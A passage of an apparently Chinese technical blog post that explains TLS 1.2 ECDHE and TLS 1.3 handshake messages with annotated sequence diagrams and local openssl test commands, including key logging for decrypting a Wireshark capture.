font-size="13" lengthAdjust="spacing" textLength="339" x="220" y="261.6919">&#31614;&#21517;&#21704;&#24076;&#31639;&#27861;&#21015;&#34920; Extension: signature_algorithms(13)</text><polygon fill="#181818" points="424.5,291.8906,414.5,295.8906,424.5,299.8906,420.5,295.8906" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="418.5" x2="920.5" y1="295.8906" y2="295.8906"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="430.5" y="290.8247">Server Hello</text><path d="M758,308.8906 L758,454.8906 L1084,454.8906 L1084,318.8906 L1074,308.8906 L758,308.8906 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1074,308.8906 L1074,318.8906 L1084,318.8906 L1074,308.8906 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="764" y="325.9575">Server Hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="764" y="341.0903">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="210" x="764" y="356.2231">Handshake Type: Server Hello(2)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="119" x="780" y="371.356">&#30830;&#23450;tls&#29256;&#26412; Version</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="780" y="386.4888">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="796" y="401.6216">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="108" x="780" y="416.7544">&#20250;&#35805;id Session ID</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="273" x="796" y="431.8872">&#29992;&#20110;&#22797;&#29992;&#20250;&#35805;&#65292;&#23458;&#25143;&#31471;&#24102;&#20102;&#23601;&#22797;&#29992;&#65292;&#21542;&#21017;&#23601;&#26032;&#24314;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="160" x="780" y="447.02">&#30830;&#23450;&#31639;&#27861;&#22871;&#20214; Cipher Suite</text><polygon fill="#181818" points="424.5,477.2188,414.5,481.2188,424.5,485.2188,420.5,481.2188" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="418.5" x2="920.5" y1="481.2188" y2="481.2188"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="332" x="430.5" y="476.1528">Certificate, Server Key Exchange, Server Hello Done</text><path d="M808,494.2188 L808,579.2188 L1034,579.2188 L1034,504.2188 L1024,494.2188 L808,494.2188 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1024,494.2188 L1024,504.2188 L1034,504.2188 L1024,494.2188 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="814" y="511.2856">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="814" y="526.4185">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="814" y="541.5513">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="830" y="556.6841">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="830" y="571.8169">&#21253;&#21547;&#20027;&#39064;&#12289;&#20844;&#38053;&#12289;&#31614;&#21517;&#31639;&#27861;</text><path d="M616,589.8828 L616,659.8828 L1227,659.8828 L1227,599.8828 L1217,589.8828 L616,589.8828 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1217,589.8828 L1217,599.8828 L1227,599.8828 L1217,589.8828 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="135" x="622" y="606.9497">Server Key Exchange</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="622" y="622.0825">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="275" x="622" y="637.2153">Handshake Type: Server Key Exchange(12)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="574" x="638" y="652.3481">&#20351;&#29992;ECDHE&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#25165;&#26377;&#30340;&#26381;&#21153;&#31471;key&#19979;&#21457;&#65307;&#26925;&#22278;&#31867;&#22411;&#12289;&#20844;&#38053;&#65292;&#20351;&#29992;&#26381;&#21153;&#31471;&#35777;&#20070;&#30340;&#31169;&#38053;&#36827;&#34892;&#31614;&#21517;</text><path d="M783,670.4141 L783,740.4141 L1060,740.4141 L1060,680.4141 L1050,670.4141 L783,670.4141 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1050,670.4141 L1050,680.4141 L1060,680.4141 L1050,670.4141 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="116" x="789" y="687.481">Server Hello Done</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="789" y="702.6138">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="256" x="789" y="717.7466">Handshake Type: Server Hello Done(14)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="100" x="789" y="732.8794">server hello&#32467;&#26463;</text><polygon fill="#181818" points="909.5,763.0781,919.5,767.0781,909.5,771.0781,913.5,767.0781" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="413.5" x2="915.5" y1="767.0781" y2="767.0781"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="484" x="420.5" y="762.0122">Client Key Exchange, Change Chipher Spec, Enctypted Handshake Message</text><line style="stroke:#181818;stroke-width:1.0;" x1="413.5" x2="455.5" y1="796.2109" y2="796.2109"/><line style="stroke:#181818;stroke-width:1.0;" x1="455.5" x2="455.5" y1="796.2109" y2="809.2109"/><line style="stroke:#181818;stroke-width:1.0;" x1="414.5" x2="455.5" y1="809.2109" y2="809.2109"/><polygon fill="#181818" points="424.5,805.2109,414.5,809.2109,424.5,813.2109,420.5,809.2109" style="stroke:#181818;stroke-width:1.0;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="111" x="420.5" y="791.145">&#29983;&#25104;&#23458;&#25143;&#31471;DH&#21442;&#25968;</text><path d="M268,822.2109 L268,892.2109 L558,892.2109 L558,832.2109 L548,822.2109 L268,822.2109 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M548,822.2109 L548,832.2109 L558,832.2109 L548,822.2109 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="129" x="274" y="839.2778">Client Key Exchange</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="274" y="854.4106">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="269" x="274" y="869.5435">Handshake Type: Client Key Exchange(16)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="189" x="290" y="884.6763">&#21457;&#36865;&#23458;&#25143;&#31471;&#30340;DH&#21442;&#25968;&#65292;&#26126;&#25991;&#21457;&#36865;</text><path d="M274,902.7422 L274,957.7422 L552,957.7422 L552,912.7422 L542,902.7422 L274,902.7422 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M542,902.7422 L542,912.7422 L552,912.7422 L542,902.7422 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="280" y="919.8091">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="280" y="934.9419">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="296" y="950.0747">&#21578;&#30693;&#26381;&#21153;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M5,968.1406 L5,1023.1406 L823,1023.1406 L823,978.1406 L813,968.1406 L5,968.1406 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M813,968.1406 L813,978.1406 L823,978.1406 L813,968.1406 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="196" x="11" y="985.2075">Enctyped Handshake Message</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="11" y="1000.3403">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="781" x="27" y="1015.4731">&#20351;&#29992;&#23458;&#25143;&#31471;DH&#21442;&#25968;&#12289;&#26381;&#21153;&#31471;DH&#21442;&#25968;&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#23458;&#25143;&#31471;&#38543;&#26426;&#25968;&#12289;&#26381;&#21153;&#31471;&#38543;&#26426;&#25968;&#12289;&#39044;&#20027;&#23494;&#38053;&#29983;&#25104;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#20027;&#23494;&#38053;&#21457;&#36865;&#21152;&#23494;&#25968;&#25454;</text><polygon fill="#181818" points="424.5,1045.6719,414.5,1049.6719,424.5,1053.6719,420.5,1049.6719" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="418.5" x2="920.5" y1="1049.6719" y2="1049.6719"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="347" x="430.5" y="1044.606">Change Chipher Spec, Enctypted Handshake Message</text><path d="M782,1062.6719 L782,1117.6719 L1060,1117.6719 L1060,1072.6719 L1050,1062.6719 L782,1062.6719 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1050,1062.6719 L1050,1072.6719 L1060,1072.6719 L1050,1062.6719 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="788" y="1079.7388">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="788" y="1094.8716">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="788" y="1110.0044">&#21578;&#30693;&#23458;&#25143;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M512,1128.0703 L512,1183.0703 L1330,1183.0703 L1330,1138.0703 L1320,1128.0703 L512,1128.0703 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1320,1128.0703 L1320,1138.0703 L1330,1138.0703 L1320,1128.0703 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="196" x="518" y="1145.1372">Enctyped Handshake Message</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="518" y="1160.27">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="781" x="534" y="1175.4028">&#20351;&#29992;&#23458;&#25143;&#31471;DH&#21442;&#25968;&#12289;&#26381;&#21153;&#31471;DH&#21442;&#25968;&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#23458;&#25143;&#31471;&#38543;&#26426;&#25968;&#12289;&#26381;&#21153;&#31471;&#38543;&#26426;&#25968;&#12289;&#39044;&#20027;&#23494;&#38053;&#29983;&#25104;&#20027;&#23494;&#38053;&#65307;&#20351;&#29992;&#20027;&#23494;&#38053;&#21457;&#36865;&#21152;&#23494;&#25968;&#25454;</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1335" x="0" y="1209.0352"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1335" y1="1209.0352" y2="1209.0352"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1335" y1="1212.0352" y2="1212.0352"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="117" x="609" y="1198.4688"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="98" x="615" y="1214.5356">&#24320;&#22987;ssl&#25968;&#25454;&#20256;&#36755;</text><!--SRC=[vLPBJzj04BxxL-pHI20rjEe1ALn2LAgAIw6z8YjiYKLmejXKv4OGq8GG7kMH5C8Z4IyLI8BQGaW2_9Xwryw9lz2nrt4S0gb0wgc-s3ixCpiptpVZ3GbXHVI98K5Ia2yWOadXGWwHZCEVSPZZt6uaom6wbANnH2rzGVE_aDlDSSoYgvUfzI2FkKRzE108Sb9GmIW8yhfZza9-SzSJb1HZDHG9uHxKBqWZibyOmtntTmTdhwnTfrlUrS4XUBHyYlvO9mSfjNAXtcPfj80yOiWFfmrEY0gMJINZ8GkpPFc45EPgNm_KyZvDvfZfxwceNZvHAzTwVbylH6qXALnfHqKolmScjf2TG5VI-g6bQVglRIxHJ9ck5z5x23autZWqdYHRMshfEpbBwVFJQgdyPc08VP34IPgwgAL-tbKNI6w7LCkMXwaZqrGlNDBpQMrpXcQIP3vBbfF8EmbbaiMWr6E1CIm9uvX_OLNXx0QKo6gCb1QiYiHIUlQuoKmSbGHb8eo7XS1eC2mg_d6PTxtiuB0qWWoGE8vvxkfb2FMWGNFTWgF5XgRTf-3eDEIxhGooUPBVL0Ao5e_Hp2dwYCD6sF-al6frKoziYoCGY6mSWjxssIwrjMErl4ZsayQ7gMSuoUTex58xAP3IeLgU8yLpfc1iBH-Is3UGq8qYgPGTkJYPsSJ9DWNtOEYvJw9FK71dlKplS0HWzFa5QRGXD6k7-e8IRiN5uUHfxTMmurrMUwcb15bQOJI4_A51rAj3hj5FQgbIowMDTfazXSQ23qP5gpdiJ1yZZpEvvt38QS-xB2wfrxS0ZjVJr-zjxNSQJz9CtEujI6eCHrYQTzKjkdz6CdFQUONi9Eoi06RcybuTm8bs50K5_NPBpowmpF-UimExvtQDQSsxNdLO36B3LAkiqkrT1xqUcSlDZFAORtXP50rXNoVoIZub4bBmI2CeD03T8W1CTQzrqcfhkpIsRFT8NpzPcePcRHty3np_dFdVZFbhXZd0LmEywa40DFKu03sQNgGRNvZAG_ZKuskjnBtu7j3WkwqPJ5RcjTq3co86QKg9sdREeDfwaIRpyCzWlnCO8MsYOAL_iFBjYjKWVWiIG6GxhBgCWLRBpK07ioO1zj-pj-Ukqu5Jw3Hd3bkzsH8B8RC2h23j1k5JITaw1PyD9WFIhiBJWRGY-2-1X1iYgKwHeuHnJpGtrUgUVhDgt1F_0000]--></g></svg>

<ul>
<li>密钥交换就是ECDHE的密钥交换过程</li>
<li>身份认证在服务端下发Certificate时，客户端会根据是否授信防中间人攻击；在服务端下发<code>Server Key Exchange</code>时会使用私钥进行签名，客户端使用下发的公钥进行验签就保证了私钥是服务端持有的，其他人无法进行签名</li>
<li>对称加密和摘要算法就都一样</li>
</ul>
<h2 id="5-TLS1-3-握手流程-TLS-AES-256-GCM-SHA384-0x1302"><a href="#5-TLS1-3-握手流程-TLS-AES-256-GCM-SHA384-0x1302" class="headerlink" title="5. TLS1.3 握手流程 TLS_AES_256_GCM_SHA384(0x1302)"></a>5. TLS1.3 握手流程 <code>TLS_AES_256_GCM_SHA384(0x1302)</code></h2><ul>
<li>使用openssl命令测试，生成的test.log可以放到wireshark解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端</span></span><br><span class="line">openssl s_server -accept 7777 -state -debug -key domain.key -cert domain.crt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -tls1_3 -cipher ECDHE -keylogfile test.log</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; openssl ciphers -V | grep &#x27;0x13,0x02&#x27;</span><br><span class="line">0x13,0x02 - TLS_AES_256_GCM_SHA384  TLSv1.3 Kx=any      Au=any  Enc=AESGCM(256) Mac=AEAD</span><br></pre></td></tr></table></figure>

<ul>
<li>使用ECDHE进行密钥交换，AES256-GCM作为对称加密套件，SHA384作为摘要算法</li>
</ul>
<img src="2023-03-24-03.png" />

<ul>
<li>上面抓包是解密的数据，所以能看到内容，正常<code>Change Chipher Spec</code>后，后面的数据都是加密的</li>
</ul>
<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="1428px" preserveAspectRatio="none" style="width:1247px;height:1428px;background:#FFFFFF;" version="1.1" viewBox="0 0 1247 1428" width="1247px" zoomAndPan="magnify" class="kroki">$2<defs/><g><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="246" x2="246" y1="36.2969" y2="1393.5938"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="877" x2="877" y1="36.2969" y2="1393.5938"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="221" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="228" y="24.9951">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="221" y="1392.5938"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="228" y="1412.5889">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="849" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="856" y="24.9951">server</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="849" y="1392.5938"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="856" y="1412.5889">server</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1240" x="0" y="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1240" y1="66.8633" y2="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1240" y1="69.8633" y2="69.8633"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="91" x="574.5" y="56.2969"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="72" x="580.5" y="72.3638">ssl&#25569;&#25163;&#38454;&#27573;</text><polygon fill="#181818" points="865.5,106.5625,875.5,110.5625,865.5,114.5625,869.5,110.5625" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="246.5" x2="871.5" y1="110.5625" y2="110.5625"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="72" x="253.5" y="105.4966">Client Hello</text><path d="M5,123.5625 L5,359.5625 L488,359.5625 L488,133.5625 L478,123.5625 L5,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M478,123.5625 L478,133.5625 L488,133.5625 L478,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="68" x="11" y="140.6294">client hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="11" y="155.7622">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="204" x="11" y="170.895">Handshake Type: Client Hello(1)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="454" x="19" y="186.0278">Version TLS 1.2 (0x0303) &#34429;&#28982;&#26159;tls1.2&#23454;&#38469;&#35201;&#30475;&#21518;&#38754;&#30340;supported_versions</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167" x="19" y="201.1606">&#31639;&#27861;&#22871;&#20214;&#20449;&#24687; Cipher Suites</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="377" x="35" y="216.2935">&#21253;&#21547;&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#12289;&#36523;&#20221;&#35748;&#35777;&#31639;&#27861;&#12289;&#23545;&#31216;&#21152;&#23494;&#31639;&#27861;&#12289;&#20449;&#24687;&#25688;&#35201;&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="19" y="231.4263">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="35" y="246.5591">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="312" x="19" y="261.6919">tls&#25903;&#25345;&#30340;&#29256;&#26412; Extensions: supported_versions(43)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="254" x="19" y="276.8247">&#35831;&#27714;&#30340;&#26381;&#21153;&#21517; Extension: server_name(0)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="339" x="19" y="291.9575">&#31614;&#21517;&#21704;&#24076;&#31639;&#27861;&#21015;&#34920; Extension: signature_algorithms(13)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="217" x="19" y="307.0903">&#23494;&#38053;&#20132;&#25442; Extension: key_share(51)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="35" y="322.2231">&#21457;&#36865;&#23458;&#25143;&#31471;&#20844;&#38053;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="349" x="19" y="337.356">&#23494;&#38053;&#20132;&#25442;&#27169;&#24335; Extension: psk_key_exchange_modes(45)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="35" y="352.4888">&#23494;&#38053;&#20132;&#25442;&#27169;&#24335;&#65292;&#35265;&#19979;&#26041;&#35299;&#37322;</text><polygon fill="#181818" points="257.5,382.6875,247.5,386.6875,257.5,390.6875,253.5,386.6875" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="251.5" x2="876.5" y1="386.6875" y2="386.6875"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="607" x="263.5" y="381.6216">Server Hello, Change Cipher Spec, Encrypted Extensions, Certificate, Certificate Verify, Finished</text><path d="M629,399.6875 L629,590.6875 L1125,590.6875 L1125,409.6875 L1115,399.6875 L629,399.6875 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1115,399.6875 L1115,409.6875 L1125,409.6875 L1115,399.6875 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="635" y="416.7544">Server Hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="635" y="431.8872">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="210" x="635" y="447.02">Handshake Type: Server Hello(2)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="651" y="462.1528">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="667" y="477.2856">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="108" x="651" y="492.4185">&#20250;&#35805;id Session ID</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="273" x="667" y="507.5513">&#29992;&#20110;&#22797;&#29992;&#20250;&#35805;&#65292;&#23458;&#25143;&#31471;&#24102;&#20102;&#23601;&#22797;&#29992;&#65292;&#21542;&#21017;&#23601;&#26032;&#24314;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="160" x="651" y="522.6841">&#30830;&#23450;&#31639;&#27861;&#22871;&#20214; Cipher Suite</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="217" x="651" y="537.8169">&#23494;&#38053;&#20132;&#25442; Extension: key_share(51)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="667" y="552.9497">&#21457;&#36865;&#26381;&#21153;&#31471;&#20844;&#38053;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="299" x="651" y="568.0825">tls&#25903;&#25345;&#29256;&#26412; Extensions: supported_versions(43)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="443" x="667" y="583.2153">&#22238;&#22797;&#23458;&#25143;&#31471;&#27492;&#23383;&#27573;&#65292;&#20195;&#34920;&#25903;&#25345;tls1.3&#29256;&#26412;&#24182;&#36873;&#25321;tls1.3&#65292;tls1.2&#19981;&#20250;&#22238;&#22797;&#27492;&#25299;&#23637;</text><path d="M742,601.2813 L742,656.2813 L1012,656.2813 L1012,611.2813 L1002,601.2813 L742,601.2813 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1002,601.2813 L1002,611.2813 L1012,611.2813 L1002,601.2813 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="130" x="748" y="618.3481">Change Cipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="249" x="748" y="633.481">Content Type: Change Cipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="748" y="648.6138">&#21578;&#30693;&#23458;&#25143;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M695,666.6797 L695,766.6797 L1059,766.6797 L1059,676.6797 L1049,666.6797 L695,666.6797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1049,666.6797 L1049,676.6797 L1059,676.6797 L1049,666.6797 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="137" x="701" y="683.7466">Encrypted Extensions</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="701" y="698.8794">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="701" y="714.0122">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="701" y="729.145">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="262" x="701" y="744.2778">Handshake Type: Encrypted Extension(8)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="343" x="701" y="759.4106">&#19968;&#33324;&#32473;&#30340;&#26159;&#19979;&#19968;&#23618;&#30340;&#21327;&#35758;&#31867;&#22411;&#65292;&#22914;ALPH Protocol: http/1.1</text><path d="M755,777.4766 L755,908.4766 L999,908.4766 L999,787.4766 L989,777.4766 L755,777.4766 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M989,777.4766 L989,787.4766 L999,787.4766 L989,777.4766 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="761" y="794.5435">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="761" y="809.6763">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="761" 